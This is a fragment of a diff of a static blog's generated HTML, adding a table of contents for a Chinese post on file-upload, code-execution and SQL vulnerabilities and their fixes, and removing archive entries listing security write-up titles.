+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任意文件上传漏洞演示-amp-剖析"><span class="toc-number">1.</span> <span class="toc-text">0x01 任意文件上传漏洞演示&剖析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞演示"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理剖析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理剖析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-代码执行漏洞演示-amp-剖析"><span class="toc-number">2.</span> <span class="toc-text">0x02 代码执行漏洞演示&剖析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞演示-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理剖析-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞原理剖析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-SQL语句执行漏洞演示-amp-剖析"><span class="toc-number">3.</span> <span class="toc-text">0x03 SQL语句执行漏洞演示&剖析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞演示-2"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞演示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞原理剖析-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞原理剖析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-漏洞修补方案"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞修补方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-文件上传漏洞的修补方案"><span class="toc-number">4.1.</span> <span class="toc-text">1. 文件上传漏洞的修补方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-代码执行和sql语句执行漏洞的修补方案"><span class="toc-number">4.2.</span> <span class="toc-text">2. 代码执行和sql语句执行漏洞的修补方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-对比5-0-11版本，查看官方解决方案"><span class="toc-number">4.3.</span> <span class="toc-text">3. 对比5.0.11版本，查看官方解决方案</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/10/国赛的两个Web题/" class="archive-article-date">
-  	<time datetime="2017-09-10T07:58:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-10</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/10/国赛的两个Web题/">国赛的两个Web题</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">全国大学生信息安全竞赛</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/10/ourphp-v1-7-3-SQL-Injection/" class="archive-article-date">
-  	<time datetime="2017-09-10T07:53:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/10/ourphp-v1-7-3-SQL-Injection/">Ourphp v1.7.3 SQL Injection</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/10/记一次渗透测试/" class="archive-article-date">
-  	<time datetime="2017-09-10T05:43:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/10/记一次渗透测试/">记一次渗透测试</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/10/hello-world/" class="archive-article-date">
-  	<time datetime="2017-09-10T02:32:29.259Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/10/hello-world/">Hello World</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -424,8 +713,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
